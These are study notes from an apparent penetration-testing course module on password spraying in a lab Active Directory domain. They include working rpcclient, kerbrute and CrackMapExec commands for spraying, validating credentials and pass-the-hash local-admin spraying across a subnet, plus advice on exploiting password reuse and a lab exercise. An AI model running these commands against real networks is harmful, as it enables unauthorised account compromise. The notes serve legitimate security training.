Once we’ve created a wordlist using one of the methods shown in the previous section, **it’s time to execute the attack.**

# Attacking from Linux
---
- `Rpcclient` is an excellent option for **performing this attack from Linux**. 
- An important consideration is that a valid login is not immediately apparent with `rpcclient`, with the response `Authority Name` indicating a successful login. 
- We can filter **out invalid login attempts by `grepping` for `Authority` in the response**. The following Bash one-liner (adapted from [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) can be used to perform the attack.
## Using a Bash one-liner for the Attack
- `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
- ![[Pasted image 20250807055058.png]]

## Using Kerbrute for the Attack
- `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`

## Using CrackMapExec & Filtering Logon Failures
- `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`
- After getting one (or more!) hits with our password spraying attack, we **==can then use `CrackMapExec` to validate the credentials quickly against a Domain Controller.==**
- `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

# Local Administrator Password Reuse
---
- Internal password spraying **==is NOT only possible with domain user accounts.==**
- If you obtain **administrative access and the NTLM password hash or cleartext password for the local administrator** account (or another privileged local account), t**his can be attempted across multiple hosts in the network**.
- **Local administrator account password reuse is widespread** due to the use of gold images in automated deployments.

- **CrackMapExec is a handy tool** for attempting this attack. 
- It is worth **targeting high-value hosts such as `SQL` or `Microsoft Exchange` servers,** as they **==are more likely to have a highly privileged user logged in or have their credentials persistent in memory.==**

- When working with local administrator accounts, **==one consideration is password re-use or common password formats across accounts.==**
- If we find a desktop host with the local administrator account password set to something unique such as `$desktop%@admin123`, it might be worth attempting `$server%@admin123` against servers.

- Also, if we **find non-standard local administrator accounts such as `bsmith`, we may find that the password is reused for a similarly named domain user account.**
- The same principle may apply to domain accounts.
- If we retrieve the **password for a user named `ajones`, it is worth trying the same password on their admin account** (if the user has one), for example, `ajones_adm`, to see if they are reusing their passwords.

- The `--local-auth` flag **will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout**. `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`.

- By default, **==without the local auth option set, the tool will attempt to authenticate using the current domain==**, which could quickly result in account lockouts.

## Local Admin Spraying with CrackMapExec
- `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`

# LABS
---
=> Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer. 

- `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | grep VALID | awk '{print $NF}' | tee valid_users.txt`
- `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 --continue-on-success`
- ![[Pasted image 20250807061024.png]]